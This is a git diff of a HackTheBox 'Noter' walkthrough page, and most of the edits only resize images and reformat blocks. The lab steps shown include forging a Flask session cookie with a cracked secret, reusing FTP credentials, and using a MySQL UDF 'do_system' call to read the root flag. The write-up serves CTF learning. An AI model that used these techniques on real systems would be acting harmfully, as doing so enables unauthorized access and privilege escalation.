@@ -8,7 +8,7 @@ favicon: /images/walkthroughs/hackthebox/noter/logo.png
 description: HTB - Noter walkthrough
 ---
 
-# Late
+# Noter
 
 <p align="center">
   <img src="/images/walkthroughs/hackthebox/noter/banner.png" width="70%"/>
@@ -54,7 +54,7 @@ In the webapp we can register for an account:
 
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/noter/1_0_message_login.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/noter/1_0_message_login.png" width="60%"/>
 </p>
 
 
@@ -74,18 +74,21 @@ gobuster dir -u "http://10.10.11.160:5000" --wordlist=/usr/share/wordlists/SecLi
 
 Doing the recon for the website, we can see different cookie values:
 
+```java
+// eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIllvdSBhcmUgbm93IHJlZ2lzdGVyZWQgYW5kIGNhbiBsb2cgaW4iXX1dfQ.YtwlfA.vLOCi9_mS4hYnzrcgaULqGqK51E
+```
 
 ```json
-// eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIllvdSBhcmUgbm93IHJlZ2lzdGVyZWQgYW5kIGNhbiBsb2cgaW4iXX1dfQ.YtwlfA.vLOCi9_mS4hYnzrcgaULqGqK51E
-
 {"_flashes":[{" t":["success","You are now registered and can log in"]}]}.-ÂWÀ¼³..Ù.â.'Î· iBê.¢¹Ô
 ```
 
 Then:
 
-```json
+```java
 // eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiS2FzaG1pciJ9.YtwoNA.0OiTKhEJh8hqXC4afvMG-_o-xHI
+```
 
+```json
 {"logged_in":true,"username":"Kashmir"}bÜ(4
 ..2¡..|.¥Âá§ï0j1.
 ```
@@ -130,7 +133,7 @@ eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4iLCJ2aXAiOnRydWV9.Ytww4g.LJeO12f5
 The vip trick didn't work, it takes me out.
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/noter/4_0.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/noter/4_0.png" width="70%"/>
 </p>
 
 
@@ -144,7 +147,7 @@ eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsInt7Nyo3fX0iXX1dfQ.YtwvIA.7GHrocqCdGOrsu
 ```
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/noter/3_0.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/noter/3_0_no_ssti.png" width="90%"/>
 </p>
 
 
@@ -217,7 +220,7 @@ with app.test_client() as client:
 Let's create a cookie with user "blue":
 
 ```bash
-kali@kali:~/Desktop/HackTheBox/Noter$ flask-unsign --sign --cookie "{'logged_in': True, 'username': 'blue'}" --secret 'secret123'
+flask-unsign --sign --cookie "{'logged_in': True, 'username': 'blue'}" --secret 'secret123'
 
 eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YtxCZg.WBKydRQS3DvXXJDRX8zjKNX46tE
 ```
@@ -253,7 +256,7 @@ We got some credentials for testing on the FTP, so let's test them:
 
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/noter/8_0_ftp.png" width="80%"/>
+  <img src="/images/walkthroughs/hackthebox/noter/8_0_ftp.png" width="70%"/>
 </p>
 
 
@@ -261,7 +264,7 @@ We can see a directory and a policy.pdf. I started with the PDF and saw some int
 
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/noter/9_0_pdf.png" width="80%"/>
+  <img src="/images/walkthroughs/hackthebox/noter/9_0_pdf.png" width="60%"/>
 </p>
 
 It describes the password format:
@@ -319,7 +322,7 @@ Seems not to work, at the moment.
 
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/noter/11_2_500.png" width="80%"/>
+  <img src="/images/walkthroughs/hackthebox/noter/11_2_500.png" width="90%"/>
 </p>
 
 
@@ -409,7 +412,7 @@ At this moment I was blocked, going over all findings and the different users in
 And it worked. We have some backup files in there:
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/noter/16_0_backups.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/noter/16_0_backups.png" width="70%"/>
 </p>
 
 
@@ -433,6 +436,7 @@ DB root user credentials:
 Using a combination of the following scripts, I could reach a reverse shell and read the root flag:
 
 [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#privilege-escalation-via-library)
+
 [Exploit-DB](https://www.exploit-db.com/exploits/1518)
 
 
@@ -460,7 +464,7 @@ show variables like '%plugin%';
 ```
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/noter/17_00_plugins.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/noter/17_00_plugins.png" width="70%"/>
 </p>
 
 
@@ -485,14 +489,14 @@ select do_system('cat /root/root.txt > /tmp/out; chown svc.svc /tmp/out');
 Then, we can retrieve the flag:
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/noter/17_0_root.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/noter/17_0_root.png" width="70%"/>
 </p>
 
 
 We can also retrieve the flag within the machine by using a set of commands to read the flag file:
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/noter/17_2_alt.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/noter/17_2_alt.png" width="70%"/>
 </p>
 
 
